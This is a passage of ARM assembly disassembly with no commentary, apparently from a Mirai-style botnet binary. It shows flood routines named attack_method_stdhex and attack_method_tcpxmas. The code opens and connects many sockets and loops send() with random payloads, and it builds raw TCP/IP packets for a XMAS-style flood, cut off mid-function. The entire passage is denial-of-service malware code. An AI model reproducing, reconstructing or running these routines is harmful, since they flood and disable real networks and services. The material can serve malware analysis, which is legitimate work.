    ddd0:	e3a02b01 	mov	r2, #1024	; 0x400
    ddd4:	eb0022bd 	bl	168d0 <__GI_memset>
    ddd8:	e1a01004 	mov	r1, r4
    dddc:	e3a02007 	mov	r2, #7
    dde0:	e1a03006 	mov	r3, r6
    dde4:	e1a00005 	mov	r0, r5
    dde8:	ebfff154 	bl	a340 <attack_get_opt_int>
    ddec:	e1a0c800 	lsl	ip, r0, #16
    ddf0:	e1a0c82c 	lsr	ip, ip, #16
    ddf4:	e1a01004 	mov	r1, r4
    ddf8:	e3a02006 	mov	r2, #6
    ddfc:	e1a03006 	mov	r3, r6
    de00:	e1a00005 	mov	r0, r5
    de04:	e58dc004 	str	ip, [sp, #4]
    de08:	ebfff14c 	bl	a340 <attack_get_opt_int>
    de0c:	e3a03e5b 	mov	r3, #1456	; 0x5b0
    de10:	e1a0b800 	lsl	fp, r0, #16
    de14:	e1a01004 	mov	r1, r4
    de18:	e2833004 	add	r3, r3, #4
    de1c:	e3a02000 	mov	r2, #0
    de20:	e1a00005 	mov	r0, r5
    de24:	ebfff145 	bl	a340 <attack_get_opt_int>
    de28:	e3a02001 	mov	r2, #1
    de2c:	e1a03002 	mov	r3, r2
    de30:	e1a0c800 	lsl	ip, r0, #16
    de34:	e1a01004 	mov	r1, r4
    de38:	e1a00005 	mov	r0, r5
    de3c:	e1a0a82c 	lsr	sl, ip, #16
    de40:	ebfff13e 	bl	a340 <attack_get_opt_int>
    de44:	e1a0482b 	lsr	r4, fp, #16
    de48:	e3a03000 	mov	r3, #0
    de4c:	e1540006 	cmp	r4, r6
    de50:	120420ff 	andne	r2, r4, #255	; 0xff
    de54:	e58d3034 	str	r3, [sp, #52]	; 0x34
    de58:	e58d3028 	str	r3, [sp, #40]	; 0x28
    de5c:	e58d302c 	str	r3, [sp, #44]	; 0x2c
    de60:	e58d3030 	str	r3, [sp, #48]	; 0x30
    de64:	11a03c2b 	lsrne	r3, fp, #24
    de68:	11832402 	orrne	r2, r3, r2, lsl #8
    de6c:	158d2008 	strne	r2, [sp, #8]
    de70:	1a000003 	bne	de84 <attack_method_stdhex+0xfc>
    de74:	eb0011df 	bl	125f8 <rand_next>
    de78:	e1a00800 	lsl	r0, r0, #16
    de7c:	e1a00820 	lsr	r0, r0, #16
    de80:	e58d0008 	str	r0, [sp, #8]
    de84:	e3570000 	cmp	r7, #0
    de88:	0a00004b 	beq	dfbc <attack_method_stdhex+0x234>
    de8c:	e3a05000 	mov	r5, #0
    de90:	e1a0b005 	mov	fp, r5
    de94:	e58d500c 	str	r5, [sp, #12]
    de98:	ea000024 	b	df30 <attack_method_stdhex+0x1a8>
    de9c:	e3a03000 	mov	r3, #0
    dea0:	e59dc008 	ldr	ip, [sp, #8]
    dea4:	e58d302c 	str	r3, [sp, #44]	; 0x2c
    dea8:	e3a03002 	mov	r3, #2
    deac:	e1cd32b8 	strh	r3, [sp, #40]	; 0x28
    deb0:	e1cdc2ba 	strh	ip, [sp, #42]	; 0x2a
    deb4:	eb00231f 	bl	16b38 <__GI_bind>
    deb8:	e5d63014 	ldrb	r3, [r6, #20]
    debc:	e353001f 	cmp	r3, #31
    dec0:	8a000010 	bhi	df08 <attack_method_stdhex+0x180>
    dec4:	e5964010 	ldr	r4, [r6, #16]
    dec8:	eb0011ca 	bl	125f8 <rand_next>
    decc:	e20418ff 	and	r1, r4, #16711680	; 0xff0000
    ded0:	e1a02c24 	lsr	r2, r4, #24
    ded4:	e1822421 	orr	r2, r2, r1, lsr #8
    ded8:	e2043cff 	and	r3, r4, #65280	; 0xff00
    dedc:	e1822403 	orr	r2, r2, r3, lsl #8
    dee0:	e5d61014 	ldrb	r1, [r6, #20]
    dee4:	e1822c04 	orr	r2, r2, r4, lsl #24
    dee8:	e0822130 	add	r2, r2, r0, lsr r1
    deec:	e20208ff 	and	r0, r2, #16711680	; 0xff0000
    def0:	e1a03c22 	lsr	r3, r2, #24
    def4:	e1833420 	orr	r3, r3, r0, lsr #8
    def8:	e2021cff 	and	r1, r2, #65280	; 0xff00
    defc:	e1833401 	orr	r3, r3, r1, lsl #8
    df00:	e1833c02 	orr	r3, r3, r2, lsl #24
    df04:	e5863004 	str	r3, [r6, #4]
    df08:	e59d200c 	ldr	r2, [sp, #12]
    df0c:	e1a01006 	mov	r1, r6
    df10:	e7920008 	ldr	r0, [r2, r8]
    df14:	e3a02010 	mov	r2, #16
    df18:	eb002328 	bl	16bc0 <__libc_connect>
    df1c:	e59d300c 	ldr	r3, [sp, #12]
    df20:	e1550007 	cmp	r5, r7
    df24:	e2833004 	add	r3, r3, #4
    df28:	e58d300c 	str	r3, [sp, #12]
    df2c:	0a00005a 	beq	e09c <attack_method_stdhex+0x314>
    df30:	e3a04801 	mov	r4, #65536	; 0x10000
    df34:	e2444001 	sub	r4, r4, #1
    df38:	e3a01001 	mov	r1, #1
    df3c:	e1a00004 	mov	r0, r4
    df40:	eb002725 	bl	17bdc <calloc>
    df44:	e59d1004 	ldr	r1, [sp, #4]
    df48:	e20120ff 	and	r2, r1, #255	; 0xff
    df4c:	e1a03421 	lsr	r3, r1, #8
    df50:	e1833402 	orr	r3, r3, r2, lsl #8
    df54:	e59d2000 	ldr	r2, [sp]
    df58:	e59dc00c 	ldr	ip, [sp, #12]
    df5c:	e1510004 	cmp	r1, r4
    df60:	e082600b 	add	r6, r2, fp
    df64:	e78c0009 	str	r0, [ip, r9]
    df68:	11c630b2 	strhne	r3, [r6, #2]
    df6c:	1a000003 	bne	df80 <attack_method_stdhex+0x1f8>
    df70:	eb0011a0 	bl	125f8 <rand_next>
    df74:	e59d1000 	ldr	r1, [sp]
    df78:	e081600b 	add	r6, r1, fp
    df7c:	e1c600b2 	strh	r0, [r6, #2]
    df80:	e3a00002 	mov	r0, #2
    df84:	e1a01000 	mov	r1, r0
    df88:	e3a02000 	mov	r2, #0
    df8c:	eb002430 	bl	17054 <__GI_socket>
    df90:	e59dc00c 	ldr	ip, [sp, #12]
    df94:	e3700001 	cmn	r0, #1
    df98:	e2855001 	add	r5, r5, #1
    df9c:	e28bb018 	add	fp, fp, #24
    dfa0:	e28d1028 	add	r1, sp, #40	; 0x28
    dfa4:	e3a02010 	mov	r2, #16
    dfa8:	e78c0008 	str	r0, [ip, r8]
    dfac:	1affffba 	bne	de9c <attack_method_stdhex+0x114>
    dfb0:	e28dd03c 	add	sp, sp, #60	; 0x3c
    dfb4:	e8bd4ff0 	pop	{r4, r5, r6, r7, r8, r9, sl, fp, lr}
    dfb8:	e12fff1e 	bx	lr
    dfbc:	e1a05007 	mov	r5, r7
    dfc0:	e1a03007 	mov	r3, r7
    dfc4:	e7993003 	ldr	r3, [r9, r3]
    dfc8:	e59fc0d4 	ldr	ip, [pc, #212]	; e0a4 <attack_method_stdhex+0x31c>
    dfcc:	e59fb0d4 	ldr	fp, [pc, #212]	; e0a8 <attack_method_stdhex+0x320>
    dfd0:	e59f60d4 	ldr	r6, [pc, #212]	; e0ac <attack_method_stdhex+0x324>
    dfd4:	e58d3024 	str	r3, [sp, #36]	; 0x24
    dfd8:	e58dc014 	str	ip, [sp, #20]
    dfdc:	e59f30cc 	ldr	r3, [pc, #204]	; e0b0 <attack_method_stdhex+0x328>
    dfe0:	e59fc0cc 	ldr	ip, [pc, #204]	; e0b4 <attack_method_stdhex+0x32c>
    dfe4:	e7991105 	ldr	r1, [r9, r5, lsl #2]
    dfe8:	e58db010 	str	fp, [sp, #16]
    dfec:	e58d3018 	str	r3, [sp, #24]
    dff0:	e58dc01c 	str	ip, [sp, #28]
    dff4:	e58d6020 	str	r6, [sp, #32]
    dff8:	e3a02002 	mov	r2, #2
    dffc:	e59f30a0 	ldr	r3, [pc, #160]	; e0a4 <attack_method_stdhex+0x31c>
    e000:	e2822001 	add	r2, r2, #1
    e004:	e58d3014 	str	r3, [sp, #20]
    e008:	e59fc0a0 	ldr	ip, [pc, #160]	; e0b0 <attack_method_stdhex+0x328>
    e00c:	e59f30a0 	ldr	r3, [pc, #160]	; e0b4 <attack_method_stdhex+0x32c>
    e010:	e3520031 	cmp	r2, #49	; 0x31
    e014:	e58db010 	str	fp, [sp, #16]
    e018:	e58dc018 	str	ip, [sp, #24]
    e01c:	e58d301c 	str	r3, [sp, #28]
    e020:	e58d6020 	str	r6, [sp, #32]
    e024:	e58d1024 	str	r1, [sp, #36]	; 0x24
    e028:	9afffff3 	bls	dffc <attack_method_stdhex+0x274>
    e02c:	eb0029ac 	bl	186e4 <rand>
    e030:	e59f3080 	ldr	r3, [pc, #128]	; e0b8 <attack_method_stdhex+0x330>
    e034:	e082c093 	umull	ip, r2, r3, r0
    e038:	e1a02122 	lsr	r2, r2, #2
    e03c:	e1a03182 	lsl	r3, r2, #3
    e040:	e0433082 	sub	r3, r3, r2, lsl #1
    e044:	e0630000 	rsb	r0, r3, r0
    e048:	e1a00100 	lsl	r0, r0, #2
    e04c:	e28d1038 	add	r1, sp, #56	; 0x38
    e050:	e0800001 	add	r0, r0, r1
    e054:	e3570000 	cmp	r7, #0
    e058:	e5104028 	ldr	r4, [r0, #-40]	; 0xffffffd8
    e05c:	0a00000b 	beq	e090 <attack_method_stdhex+0x308>
    e060:	e3a05000 	mov	r5, #0
    e064:	e7980105 	ldr	r0, [r8, r5, lsl #2]
    e068:	e1a0200a 	mov	r2, sl
    e06c:	e2855001 	add	r5, r5, #1
    e070:	e1a01004 	mov	r1, r4
    e074:	e3a03901 	mov	r3, #16384	; 0x4000
    e078:	eb002392 	bl	16ec8 <__libc_send>
    e07c:	e1550007 	cmp	r5, r7
    e080:	e3a02000 	mov	r2, #0
    e084:	1afffff6 	bne	e064 <attack_method_stdhex+0x2dc>
    e088:	e7991105 	ldr	r1, [r9, r5, lsl #2]
    e08c:	eaffffda 	b	dffc <attack_method_stdhex+0x274>
    e090:	e7991107 	ldr	r1, [r9, r7, lsl #2]
    e094:	e1a02007 	mov	r2, r7
    e098:	eaffffd7 	b	dffc <attack_method_stdhex+0x274>
    e09c:	e1a03105 	lsl	r3, r5, #2
    e0a0:	eaffffc7 	b	dfc4 <attack_method_stdhex+0x23c>
    e0a4:	0001f0e4 	.word	0x0001f0e4
    e0a8:	0001efe0 	.word	0x0001efe0
    e0ac:	0001f23c 	.word	0x0001f23c
    e0b0:	0001f178 	.word	0x0001f178
    e0b4:	0001f1b4 	.word	0x0001f1b4
    e0b8:	aaaaaaab 	.word	0xaaaaaaab

0000e0bc <attack_method_tcpxmas>:
    e0bc:	e92d4ff0 	push	{r4, r5, r6, r7, r8, r9, sl, fp, lr}
    e0c0:	e24ddf5b 	sub	sp, sp, #364	; 0x16c
    e0c4:	e58d1008 	str	r1, [sp, #8]
    e0c8:	e3a01010 	mov	r1, #16
    e0cc:	e1a04002 	mov	r4, r2
    e0d0:	e1a05003 	mov	r5, r3
    e0d4:	e1a06000 	mov	r6, r0
    e0d8:	eb0026bf 	bl	17bdc <calloc>
    e0dc:	e3a01004 	mov	r1, #4
    e0e0:	e58d000c 	str	r0, [sp, #12]
    e0e4:	e1a00006 	mov	r0, r6
    e0e8:	eb0026bb 	bl	17bdc <calloc>
    e0ec:	e1a01005 	mov	r1, r5
    e0f0:	e58d0010 	str	r0, [sp, #16]
    e0f4:	e3a02002 	mov	r2, #2
    e0f8:	e3a03000 	mov	r3, #0
    e0fc:	e1a00004 	mov	r0, r4
    e100:	ebfff08e 	bl	a340 <attack_get_opt_int>
    e104:	e3a03801 	mov	r3, #65536	; 0x10000
    e108:	e1a0c000 	mov	ip, r0
    e10c:	e20cc0ff 	and	ip, ip, #255	; 0xff
    e110:	e2433001 	sub	r3, r3, #1
    e114:	e3a02003 	mov	r2, #3
    e118:	e1a01005 	mov	r1, r5
    e11c:	e1a00004 	mov	r0, r4
    e120:	e58dc014 	str	ip, [sp, #20]
    e124:	ebfff085 	bl	a340 <attack_get_opt_int>
    e128:	e1a01005 	mov	r1, r5
    e12c:	e3a02004 	mov	r2, #4
    e130:	e3a03040 	mov	r3, #64	; 0x40
    e134:	e1a07000 	mov	r7, r0
    e138:	e1a00004 	mov	r0, r4
    e13c:	ebfff07f 	bl	a340 <attack_get_opt_int>
    e140:	e1a0c000 	mov	ip, r0
    e144:	e20cc0ff 	and	ip, ip, #255	; 0xff
    e148:	e1a01005 	mov	r1, r5
    e14c:	e3a02005 	mov	r2, #5
    e150:	e3a03001 	mov	r3, #1
    e154:	e1a00004 	mov	r0, r4
    e158:	e58dc018 	str	ip, [sp, #24]
    e15c:	ebfff077 	bl	a340 <attack_get_opt_int>
    e160:	e3a03801 	mov	r3, #65536	; 0x10000
    e164:	e1a0c000 	mov	ip, r0
    e168:	e20cc0ff 	and	ip, ip, #255	; 0xff
    e16c:	e2433001 	sub	r3, r3, #1
    e170:	e1a01005 	mov	r1, r5
    e174:	e3a02007 	mov	r2, #7
    e178:	e1a00004 	mov	r0, r4
    e17c:	e58dc01c 	str	ip, [sp, #28]
    e180:	ebfff06e 	bl	a340 <attack_get_opt_int>
    e184:	e1a01005 	mov	r1, r5
    e188:	e1a0c800 	lsl	ip, r0, #16
    e18c:	e3a0200b 	mov	r2, #11
    e190:	e3a03001 	mov	r3, #1
    e194:	e1a00004 	mov	r0, r4
    e198:	e1a0a82c 	lsr	sl, ip, #16
    e19c:	ebfff067 	bl	a340 <attack_get_opt_int>
    e1a0:	e1a0c000 	mov	ip, r0
    e1a4:	e20cc0ff 	and	ip, ip, #255	; 0xff
    e1a8:	e1a01005 	mov	r1, r5
    e1ac:	e3a0200c 	mov	r2, #12
    e1b0:	e3a03001 	mov	r3, #1
    e1b4:	e1a00004 	mov	r0, r4
    e1b8:	e58dc020 	str	ip, [sp, #32]
    e1bc:	ebfff05f 	bl	a340 <attack_get_opt_int>
    e1c0:	e1a0c000 	mov	ip, r0
    e1c4:	e20cc0ff 	and	ip, ip, #255	; 0xff
    e1c8:	e1a01005 	mov	r1, r5
    e1cc:	e3a0200d 	mov	r2, #13
    e1d0:	e3a03001 	mov	r3, #1
    e1d4:	e1a00004 	mov	r0, r4
    e1d8:	e58dc024 	str	ip, [sp, #36]	; 0x24
    e1dc:	ebfff057 	bl	a340 <attack_get_opt_int>
    e1e0:	e1a0c000 	mov	ip, r0
    e1e4:	e20cc0ff 	and	ip, ip, #255	; 0xff
    e1e8:	e1a01005 	mov	r1, r5
    e1ec:	e3a0200e 	mov	r2, #14
    e1f0:	e3a03001 	mov	r3, #1
    e1f4:	e1a00004 	mov	r0, r4
    e1f8:	e58dc028 	str	ip, [sp, #40]	; 0x28
    e1fc:	ebfff04f 	bl	a340 <attack_get_opt_int>
    e200:	e1a0c000 	mov	ip, r0
    e204:	e20cc0ff 	and	ip, ip, #255	; 0xff
    e208:	e1a01005 	mov	r1, r5
    e20c:	e3a0200f 	mov	r2, #15
    e210:	e3a03001 	mov	r3, #1
    e214:	e1a00004 	mov	r0, r4
    e218:	e58dc02c 	str	ip, [sp, #44]	; 0x2c
    e21c:	ebfff047 	bl	a340 <attack_get_opt_int>
    e220:	e1a0c000 	mov	ip, r0
    e224:	e20cc0ff 	and	ip, ip, #255	; 0xff
    e228:	e1a01005 	mov	r1, r5
    e22c:	e3a02010 	mov	r2, #16
    e230:	e3a03001 	mov	r3, #1
    e234:	e1a00004 	mov	r0, r4
    e238:	e58dc030 	str	ip, [sp, #48]	; 0x30
    e23c:	ebfff03f 	bl	a340 <attack_get_opt_int>
    e240:	e1a0c000 	mov	ip, r0
    e244:	e20cc0ff 	and	ip, ip, #255	; 0xff
    e248:	e3a02000 	mov	r2, #0
    e24c:	e3a03c03 	mov	r3, #768	; 0x300
    e250:	e1a01005 	mov	r1, r5
    e254:	e1a00004 	mov	r0, r4
    e258:	e58dc034 	str	ip, [sp, #52]	; 0x34
    e25c:	ebfff037 	bl	a340 <attack_get_opt_int>
    e260:	e3a02001 	mov	r2, #1
    e264:	e1a03002 	mov	r3, r2
    e268:	e58d0038 	str	r0, [sp, #56]	; 0x38
    e26c:	e1a01005 	mov	r1, r5
    e270:	e1a00004 	mov	r0, r4
    e274:	ebfff031 	bl	a340 <attack_get_opt_int>
    e278:	e1a03000 	mov	r3, r0
    e27c:	e20330ff 	and	r3, r3, #255	; 0xff
    e280:	e3a01003 	mov	r1, #3
    e284:	e3a00002 	mov	r0, #2
    e288:	e3a02006 	mov	r2, #6
    e28c:	e58d303c 	str	r3, [sp, #60]	; 0x3c
    e290:	eb00236f 	bl	17054 <__GI_socket>
    e294:	e3700001 	cmn	r0, #1
    e298:	e1a09000 	mov	r9, r0
    e29c:	0a000078 	beq	e484 <attack_method_tcpxmas+0x3c8>
    e2a0:	e28d3f5a 	add	r3, sp, #360	; 0x168
    e2a4:	e3a02001 	mov	r2, #1
    e2a8:	e5232004 	str	r2, [r3, #-4]!
    e2ac:	e3a0c004 	mov	ip, #4
    e2b0:	e3a01000 	mov	r1, #0
    e2b4:	e2822002 	add	r2, r2, #2
    e2b8:	e58dc000 	str	ip, [sp]
    e2bc:	eb002352 	bl	1700c <__GI_setsockopt>
    e2c0:	e3700001 	cmn	r0, #1
    e2c4:	0a00006c 	beq	e47c <attack_method_tcpxmas+0x3c0>
    e2c8:	e1a02807 	lsl	r2, r7, #16
    e2cc:	e3a03000 	mov	r3, #0
    e2d0:	e3560000 	cmp	r6, #0
    e2d4:	e58d3164 	str	r3, [sp, #356]	; 0x164
    e2d8:	e1a0b822 	lsr	fp, r2, #16
    e2dc:	0a000109 	beq	e708 <attack_method_tcpxmas+0x64c>
    e2e0:	e3a00002 	mov	r0, #2
    e2e4:	e3a01001 	mov	r1, #1
    e2e8:	e3a02000 	mov	r2, #0
    e2ec:	eb002358 	bl	17054 <__GI_socket>
    e2f0:	e3700001 	cmn	r0, #1
    e2f4:	e1a05000 	mov	r5, r0
    e2f8:	0a000055 	beq	e454 <attack_method_tcpxmas+0x398>
    e2fc:	e3a01003 	mov	r1, #3
    e300:	e3a02000 	mov	r2, #0
    e304:	eb001f2a 	bl	15fb4 <__GI___libc_fcntl>
    e308:	e3a01004 	mov	r1, #4
    e30c:	e3802b02 	orr	r2, r0, #2048	; 0x800
    e310:	e1a00005 	mov	r0, r5
    e314:	eb001f26 	bl	15fb4 <__GI___libc_fcntl>
    e318:	e59d2164 	ldr	r2, [sp, #356]	; 0x164
    e31c:	e1a03282 	lsl	r3, r2, #5
    e320:	e0433182 	sub	r3, r3, r2, lsl #3
    e324:	e3a01002 	mov	r1, #2
    e328:	e59d2008 	ldr	r2, [sp, #8]
    e32c:	e28d0c01 	add	r0, sp, #256	; 0x100
    e330:	e1c015b0 	strh	r1, [r0, #80]	; 0x50
    e334:	e0833002 	add	r3, r3, r2
    e338:	e5d32014 	ldrb	r2, [r3, #20]
    e33c:	e352001f 	cmp	r2, #31
    e340:	85933010 	ldrhi	r3, [r3, #16]
    e344:	858d3154 	strhi	r3, [sp, #340]	; 0x154
    e348:	9a000050 	bls	e490 <attack_method_tcpxmas+0x3d4>
    e34c:	e3a03801 	mov	r3, #65536	; 0x10000
    e350:	e2433001 	sub	r3, r3, #1
    e354:	e15a0003 	cmp	sl, r3
    e358:	11a0342a 	lsrne	r3, sl, #8
    e35c:	120a20ff 	andne	r2, sl, #255	; 0xff
    e360:	11833402 	orrne	r3, r3, r2, lsl #8
    e364:	128d0c01 	addne	r0, sp, #256	; 0x100
    e368:	11c035b2 	strhne	r3, [r0, #82]	; 0x52
    e36c:	0a00005e 	beq	e4ec <attack_method_tcpxmas+0x430>
    e370:	e28d1e15 	add	r1, sp, #336	; 0x150
    e374:	e3a02010 	mov	r2, #16
    e378:	e1a00005 	mov	r0, r5
    e37c:	eb00220f 	bl	16bc0 <__libc_connect>
    e380:	e3a00000 	mov	r0, #0
    e384:	eb002018 	bl	163ec <__GI_time>
    e388:	e1a04000 	mov	r4, r0
    e38c:	ea000003 	b	e3a0 <attack_method_tcpxmas+0x2e4>
    e390:	eb002015 	bl	163ec <__GI_time>
    e394:	e0640000 	rsb	r0, r4, r0
    e398:	e350000a 	cmp	r0, #10
    e39c:	ca000023 	bgt	e430 <attack_method_tcpxmas+0x374>
    e3a0:	e3a0c010 	mov	ip, #16
    e3a4:	e58dc160 	str	ip, [sp, #352]	; 0x160
    e3a8:	e28dcd05 	add	ip, sp, #320	; 0x140
    e3ac:	e3a02c01 	mov	r2, #256	; 0x100
    e3b0:	e58dc000 	str	ip, [sp]
    e3b4:	e28d1040 	add	r1, sp, #64	; 0x40
    e3b8:	e28dce16 	add	ip, sp, #352	; 0x160
    e3bc:	e3a03901 	mov	r3, #16384	; 0x4000
    e3c0:	e1a00009 	mov	r0, r9
    e3c4:	e58dc004 	str	ip, [sp, #4]
    e3c8:	eb00228b 	bl	16dfc <__libc_recvfrom>
    e3cc:	e1a02000 	mov	r2, r0
    e3d0:	e3720001 	cmn	r2, #1
    e3d4:	e3a00000 	mov	r0, #0
    e3d8:	0a000029 	beq	e484 <attack_method_tcpxmas+0x3c8>
    e3dc:	e59d1154 	ldr	r1, [sp, #340]	; 0x154
    e3e0:	e59d3144 	ldr	r3, [sp, #324]	; 0x144
    e3e4:	e1530001 	cmp	r3, r1
    e3e8:	13a0c000 	movne	ip, #0
    e3ec:	03a0c001 	moveq	ip, #1
    e3f0:	e3520028 	cmp	r2, #40	; 0x28
    e3f4:	93a0c000 	movls	ip, #0
    e3f8:	e15c0000 	cmp	ip, r0
    e3fc:	0affffe3 	beq	e390 <attack_method_tcpxmas+0x2d4>
    e400:	e28d3054 	add	r3, sp, #84	; 0x54
    e404:	e1d3e0b0 	ldrh	lr, [r3]
    e408:	e28d3c01 	add	r3, sp, #256	; 0x100
    e40c:	e1d325b2 	ldrh	r2, [r3, #82]	; 0x52
    e410:	e15e0002 	cmp	lr, r2
    e414:	1affffdd 	bne	e390 <attack_method_tcpxmas+0x2d4>
    e418:	e5dd2061 	ldrb	r2, [sp, #97]	; 0x61
    e41c:	e2023012 	and	r3, r2, #18
    e420:	e3530012 	cmp	r3, #18
    e424:	0a000034 	beq	e4fc <attack_method_tcpxmas+0x440>
    e428:	e3120005 	tst	r2, #5
    e42c:	0affffd7 	beq	e390 <attack_method_tcpxmas+0x2d4>
    e430:	e1a00005 	mov	r0, r5
    e434:	eb002e81 	bl	19e40 <__GI___libc_close>
    e438:	e3a00002 	mov	r0, #2
    e43c:	e3a01001 	mov	r1, #1
    e440:	e3a02000 	mov	r2, #0
    e444:	eb002302 	bl	17054 <__GI_socket>
    e448:	e3700001 	cmn	r0, #1
    e44c:	e1a05000 	mov	r5, r0
    e450:	1affffa9 	bne	e2fc <attack_method_tcpxmas+0x240>
    e454:	e59d3164 	ldr	r3, [sp, #356]	; 0x164
    e458:	e2833001 	add	r3, r3, #1
    e45c:	e1530006 	cmp	r3, r6
    e460:	e58d3164 	str	r3, [sp, #356]	; 0x164
    e464:	baffff9d 	blt	e2e0 <attack_method_tcpxmas+0x224>
    e468:	e59d0038 	ldr	r0, [sp, #56]	; 0x38
    e46c:	e2807028 	add	r7, r0, #40	; 0x28
    e470:	e1a02800 	lsl	r2, r0, #16
    e474:	e280a014 	add	sl, r0, #20
    e478:	ea0000a6 	b	e718 <attack_method_tcpxmas+0x65c>
    e47c:	e1a00009 	mov	r0, r9
    e480:	eb002e6e 	bl	19e40 <__GI___libc_close>
    e484:	e28ddf5b 	add	sp, sp, #364	; 0x16c
    e488:	e8bd4ff0 	pop	{r4, r5, r6, r7, r8, r9, sl, fp, lr}
    e48c:	e12fff1e 	bx	lr
    e490:	e5934010 	ldr	r4, [r3, #16]
    e494:	eb001057 	bl	125f8 <rand_next>
    e498:	e59d3164 	ldr	r3, [sp, #356]	; 0x164
    e49c:	e1a01283 	lsl	r1, r3, #5
    e4a0:	e0411183 	sub	r1, r1, r3, lsl #3
    e4a4:	e59d3008 	ldr	r3, [sp, #8]
    e4a8:	e204c8ff 	and	ip, r4, #16711680	; 0xff0000
    e4ac:	e1a02c24 	lsr	r2, r4, #24
    e4b0:	e0811003 	add	r1, r1, r3
    e4b4:	e182242c 	orr	r2, r2, ip, lsr #8
    e4b8:	e2043cff 	and	r3, r4, #65280	; 0xff00
    e4bc:	e5d1c014 	ldrb	ip, [r1, #20]
    e4c0:	e1822403 	orr	r2, r2, r3, lsl #8
    e4c4:	e1822c04 	orr	r2, r2, r4, lsl #24
    e4c8:	e0822c30 	add	r2, r2, r0, lsr ip
    e4cc:	e20208ff 	and	r0, r2, #16711680	; 0xff0000
    e4d0:	e1a03c22 	lsr	r3, r2, #24
    e4d4:	e1833420 	orr	r3, r3, r0, lsr #8
    e4d8:	e2021cff 	and	r1, r2, #65280	; 0xff00
    e4dc:	e1833401 	orr	r3, r3, r1, lsl #8
    e4e0:	e1833c02 	orr	r3, r3, r2, lsl #24
    e4e4:	e58d3154 	str	r3, [sp, #340]	; 0x154
    e4e8:	eaffff97 	b	e34c <attack_method_tcpxmas+0x290>
    e4ec:	eb001041 	bl	125f8 <rand_next>
    e4f0:	e28dcc01 	add	ip, sp, #256	; 0x100
    e4f4:	e1cc05b2 	strh	r0, [ip, #82]	; 0x52
    e4f8:	eaffff9c 	b	e370 <attack_method_tcpxmas+0x2b4>
    e4fc:	e59d4164 	ldr	r4, [sp, #356]	; 0x164
    e500:	e59dc00c 	ldr	ip, [sp, #12]
    e504:	e78c1204 	str	r1, [ip, r4, lsl #4]
    e508:	e5981004 	ldr	r1, [r8, #4]
    e50c:	e20108ff 	and	r0, r1, #16711680	; 0xff0000
    e510:	e1a03c21 	lsr	r3, r1, #24
    e514:	e2012cff 	and	r2, r1, #65280	; 0xff00
    e518:	e1833420 	orr	r3, r3, r0, lsr #8
    e51c:	e59d000c 	ldr	r0, [sp, #12]
    e520:	e1833402 	orr	r3, r3, r2, lsl #8
    e524:	e1a0c204 	lsl	ip, r4, #4
    e528:	e08cc000 	add	ip, ip, r0
    e52c:	e1833c01 	orr	r3, r3, r1, lsl #24
    e530:	e58c3004 	str	r3, [ip, #4]
    e534:	e5981008 	ldr	r1, [r8, #8]
    e538:	e20108ff 	and	r0, r1, #16711680	; 0xff0000
    e53c:	e1a03c21 	lsr	r3, r1, #24
    e540:	e2012cff 	and	r2, r1, #65280	; 0xff00
    e544:	e1833420 	orr	r3, r3, r0, lsr #8
    e548:	e1833402 	orr	r3, r3, r2, lsl #8
    e54c:	e59d2038 	ldr	r2, [sp, #56]	; 0x38
    e550:	e1833c01 	orr	r3, r3, r1, lsl #24
    e554:	e1d810b2 	ldrh	r1, [r8, #2]
    e558:	e2827028 	add	r7, r2, #40	; 0x28
    e55c:	e1cce0be 	strh	lr, [ip, #14]
    e560:	e1cc10bc 	strh	r1, [ip, #12]
    e564:	e58c3008 	str	r3, [ip, #8]
    e568:	e1a00007 	mov	r0, r7
    e56c:	eb00234c 	bl	172a4 <malloc>
    e570:	e59d2010 	ldr	r2, [sp, #16]
    e574:	e59d3010 	ldr	r3, [sp, #16]
    e578:	e7820104 	str	r0, [r2, r4, lsl #2]
    e57c:	e59d2164 	ldr	r2, [sp, #356]	; 0x164
    e580:	e7934102 	ldr	r4, [r3, r2, lsl #2]
    e584:	e5d43000 	ldrb	r3, [r4]
    e588:	e3c330b0 	bic	r3, r3, #176	; 0xb0
    e58c:	e3833040 	orr	r3, r3, #64	; 0x40
    e590:	e5c43000 	strb	r3, [r4]
    e594:	e5d43000 	ldrb	r3, [r4]
    e598:	e1a0c807 	lsl	ip, r7, #16
    e59c:	e1a0242c 	lsr	r2, ip, #8
    e5a0:	e3c3300a 	bic	r3, r3, #10
    e5a4:	e3833005 	orr	r3, r3, #5
    e5a8:	e2022cff 	and	r2, r2, #65280	; 0xff00
    e5ac:	e1822c2c 	orr	r2, r2, ip, lsr #24
    e5b0:	e20b00ff 	and	r0, fp, #255	; 0xff
    e5b4:	e59dc01c 	ldr	ip, [sp, #28]
    e5b8:	e1a0142b 	lsr	r1, fp, #8
    e5bc:	e5c43000 	strb	r3, [r4]
    e5c0:	e1811400 	orr	r1, r1, r0, lsl #8
    e5c4:	e59d0014 	ldr	r0, [sp, #20]
    e5c8:	e5c40001 	strb	r0, [r4, #1]
    e5cc:	e1c410b4 	strh	r1, [r4, #4]
    e5d0:	e35c0000 	cmp	ip, #0
    e5d4:	e59d1018 	ldr	r1, [sp, #24]
    e5d8:	e1c420b2 	strh	r2, [r4, #2]
    e5dc:	e3a03006 	mov	r3, #6
    e5e0:	13a02040 	movne	r2, #64	; 0x40
    e5e4:	e5c41008 	strb	r1, [r4, #8]
    e5e8:	e5c43009 	strb	r3, [r4, #9]
    e5ec:	11c420b6 	strhne	r2, [r4, #6]
    e5f0:	e59f2274 	ldr	r2, [pc, #628]	; e86c <attack_method_tcpxmas+0x7b0>
    e5f4:	e5921000 	ldr	r1, [r2]
    e5f8:	e584100c 	str	r1, [r4, #12]
    e5fc:	e59d3164 	ldr	r3, [sp, #356]	; 0x164
    e600:	e59dc00c 	ldr	ip, [sp, #12]
    e604:	e79c2203 	ldr	r2, [ip, r3, lsl #4]
    e608:	e1a03203 	lsl	r3, r3, #4
    e60c:	e083300c 	add	r3, r3, ip
    e610:	e5842010 	str	r2, [r4, #16]
    e614:	e1d300bc 	ldrh	r0, [r3, #12]
    e618:	e5931008 	ldr	r1, [r3, #8]
    e61c:	e1c401b4 	strh	r0, [r4, #20]
    e620:	e2848014 	add	r8, r4, #20
    e624:	e5d8200d 	ldrb	r2, [r8, #13]
    e628:	e5881004 	str	r1, [r8, #4]
    e62c:	e3822001 	orr	r2, r2, #1
    e630:	e5931004 	ldr	r1, [r3, #4]
    e634:	e1d330be 	ldrh	r3, [r3, #14]
    e638:	e5c8200d 	strb	r2, [r8, #13]
    e63c:	e1c830b2 	strh	r3, [r8, #2]
    e640:	e5d8300c 	ldrb	r3, [r8, #12]
